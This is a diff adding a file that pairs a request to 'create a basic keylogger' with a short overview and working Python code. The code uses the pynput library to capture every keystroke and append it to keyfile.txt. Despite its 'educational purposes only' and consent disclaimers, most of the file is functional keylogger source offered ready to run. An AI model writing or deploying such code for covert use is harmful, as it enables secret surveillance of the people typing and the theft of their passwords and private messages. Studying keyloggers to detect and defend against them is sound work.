@@ -1,0 +1,37 @@
+Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.
+
+This script demonstrates basic keystroke logging functionality using the pynput library. 
+
+Important Note: Keyloggers pose significant ethical and security risks. This code is provided for educational purposes only to understand their potential dangers. Never deploy a keylogger on a system without explicit consent.
+
+Functionality (Educational Overview):
+
+Imports: The script imports the keyboard module from the pynput library.
+keyPressed Function: This function handles key presses.
+It attempts to convert the pressed key to a character (e.g., 'a', 'b').
+If successful, it writes the character to a file named "keyfile.txt" in append mode.
+Errors (special keys) are caught and reported.
+Main Execution:
+A Listener object is created to listen for key presses.
+The listener is started, triggering the keyPressed function on each key press.
+The script waits for the user to press any key to stop logging (using input()).
+
+CODE :-
+
+#A Simple Keylogger
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error getting char")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+
